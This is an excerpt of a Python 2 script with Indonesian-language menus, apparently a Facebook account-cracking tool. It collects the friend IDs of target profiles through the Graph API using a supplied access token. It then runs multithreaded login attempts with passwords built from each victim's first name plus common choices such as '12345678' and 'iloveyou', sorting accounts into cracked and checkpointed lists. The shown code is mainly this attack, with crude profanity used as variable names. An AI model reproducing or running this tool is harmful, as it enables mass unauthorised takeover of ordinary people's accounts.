...
\033[1;95m█\033[1;93m▲▲▲▲▲\033[1;91m--  - _ --\033[1;92m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ \033[1;93mV2.0
\033[1;95m█████████      \033[1;96m«----------✧----------»
\033[1;95m ██ ██
\033[1;97m╔════════════════════════════════════════════╗
...
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        ...
        print '\n\n [%s!%s] kamu masih belum mendapatkan hasil, coba ganti fb atau ganti target'%(M,N);exit()
...
def yayanxd():
    ...
    try:
        ...
        print '\n\n %s[%s!%s] token salah'%(N,M,N);time.sleep(2);yayanxd()
...
def moch_yayan():
    ...
    print ' (\033[0;96m•\033[0m) NAMA FB ANDA : %s'%(nama);time.sleep(0.03)
    print ' (\033[0;96m•\033[0m) IP ANDA   : %s'%(IP)
    print '___________________________________________________________\n';time.sleep(0.03)
    print ' [%s01%s]. Crack id dari teman'%(O,N);time.sleep(0.03)
    ...
    print ' [%s10%s]. logout (%shapus token%s)'%(M,N,M,N);time.sleep(0.03)
    print ' [%s11%s]. Crack id massal'%(O,N);time.sleep(0.03)
    pepek = raw_input('\n [*] menu : ')
    if pepek == '':
        print '\n %s[%s×%s] Anda belum memasukkan pilihan!'%(N,M,N);time.sleep(2);moch_yayan()
    elif pepek in['1','01']:
        teman(kontol)
    elif pepek in['2','02']:
        publik(kontol)
...
def massal(kontol):
	...
	for t in range(tanya_total):
		...
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(asw,kontol)).json()["data"]:
				uid = i["id"]
...
def info_tools():
    ...
    print '\n %s[%s>%s] Yt       : Zhulant OS.'%(N,H,N);time.sleep(0.07)
            ...
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        xz = bb[1].split(' ')
                        if len(xz)>=6:
                            pwx = [ xz[0], xz[0]+"123", xz[0]+"1234", xz[0]+"12345", "anjing", "sayang", "iloveyou", "12345678" ]
                        elif len(xz)<=2:
                            pwx = [ xz[0]+"123", xz[0]+"1234", xz[0]+"12345", "anjing", "sayang", "iloveyou", "12345678" ]
                        elif len(xz)<=3:
                            pwx = [ xz[0]+"123", xz[0]+"12345", "anjing", "sayang", "iloveyou", "12345678" ]
                        else:
                            pwx = [ xz[0]+"123", xz[0]+"12345", "anjing", "sayang", "iloveyou", "12345678" ]
